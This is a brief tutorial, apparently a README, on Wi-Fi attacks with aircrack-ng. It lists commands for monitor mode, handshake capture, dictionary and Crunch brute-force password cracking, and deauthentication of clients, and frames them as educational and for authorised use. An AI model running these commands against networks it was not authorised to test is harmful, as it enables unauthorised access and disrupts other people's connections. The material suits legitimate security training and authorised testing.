# Wi-Fi Attacks Practical Guide

In this guide, we'll explore Wi-Fi attacks, including switching adapters to monitor mode, capturing handshakes, and cracking passwords using aircrack-ng. Please note that attempting these actions on networks without proper authorization is illegal and unethical. This guide is for educational purposes only.

## Prerequisites

Make sure you have the necessary tools installed, including aircrack-ng and Crunch.

```bash
# Install aircrack-ng
sudo apt-get install aircrack-ng

# Install Crunch
sudo apt-get install crunch
```
## Switching Adapters to Monitor Mode
Command:  

            `sudo airmon-ng start [interface]`
            
            Replace [interface] with your Wi-Fi interface name.

## Capturing Handshakes
Command: 
            
            `sudo airodump-ng [monitored_interface]`
            
            Replace [monitored_interface] with the interface created in monitor mode.

## Cracking Passwords using aircrack-ng (Dictionary Attack)
Command: 

            `sudo aircrack-ng -w [dictionary_file] -b [BSSID] [capture_file.cap]`
            
            Replace [dictionary_file] with the path to your dictionary file, [BSSID] with the target BSSID, and [capture_file.cap] with the handshake capture file.

## Cracking Passwords using aircrack-ng and Crunch (Brute Force Method)

Create a Wordlist with Crunch: 
            
            `crunch [min_length] [max_length] -o [output_file]`
            
            Replace [min_length] and [max_length] with the desired password length range.

Command: 
            
            `sudo aircrack-ng -w [wordlist_file] -b [BSSID] [capture_file.cap]`
            
            Replace [wordlist_file] with the path to your wordlist file.

## Executing a De-authentication Attack

Command: 

        `sudo aireplay-ng --deauth [number_of_deauths] -a [BSSID] -c [client_MAC] [monitored_interface]`
        
        Replace [number_of_deauths], [BSSID], [client_MAC], and [monitored_interface] with the appropriate values.
        
Remember to use this knowledge responsibly and only on networks for which you have explicit permission.
